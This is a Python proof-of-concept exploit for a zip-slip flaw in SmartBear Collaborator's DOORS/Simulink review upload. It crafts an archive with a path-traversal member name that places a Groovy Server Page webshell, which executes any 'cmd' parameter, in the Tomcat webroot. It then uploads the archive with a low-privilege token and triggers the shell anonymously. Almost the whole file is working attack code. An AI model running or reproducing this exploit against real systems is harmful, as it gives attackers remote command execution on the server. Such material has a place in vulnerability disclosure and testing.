#!/usr/bin/env python3
"""PoC: SmartBear Collaborator DOORS/Simulink review-upload zip-slip to webroot.

A low-privilege account uploads a review archive whose member name escapes the
per-review version directory with repeated parent hops and lands a Groovy
Server Page under the Tomcat webroot (webapps/ROOT). An anonymous GET then
compiles and runs it in memory. Depth is 4 + n per the advisory.
"""
import io
import zipfile
import requests

TARGET = "https://collab.internal.example"

# Groovy Server Page webshell: reads a request parameter and runs it.
GSP_SHELL = (
    '<%@ page import="java.util.*,java.io.*" %>\n'
    '<%\n'
    '    String cmd = request.getParameter("cmd");\n'
    '    if (cmd != null) {\n'
    '        Process p = Runtime.getRuntime().exec(cmd);\n'
    '        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
    '        String line;\n'
    '        while ((line = br.readLine()) != null) { out.println(line); }\n'
    '    }\n'
    '%>\n'
)


def build_zip_slip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("review/module.reqif", "<reqif>exported DOORS module</reqif>\n")
        # Escape destVersionDir into the live Tomcat webroot.
        z.writestr("../../../../../webapps/ROOT/collab_review.gsp", GSP_SHELL)
    return buf.getvalue()


def upload(token: str) -> None:
    files = {"file": ("review.zip", build_zip_slip(), "application/octet-stream")}
    data = {"json": '{"command":"ReviewService.addDoorsFiles","args":{"reviewId":1}}'}
    requests.post(TARGET + "/services/json/v1", files=files, data=data,
                  headers={"Authorization": "Bearer " + token})


def trigger() -> str:
    # Unauthenticated GET; *.gsp is mapped to groovy.servlet.TemplateServlet.
    return requests.get(TARGET + "/collab_review.gsp", params={"cmd": "id"}).text


if __name__ == "__main__":
    upload("<low-priv-session-token>")
    print(trigger())
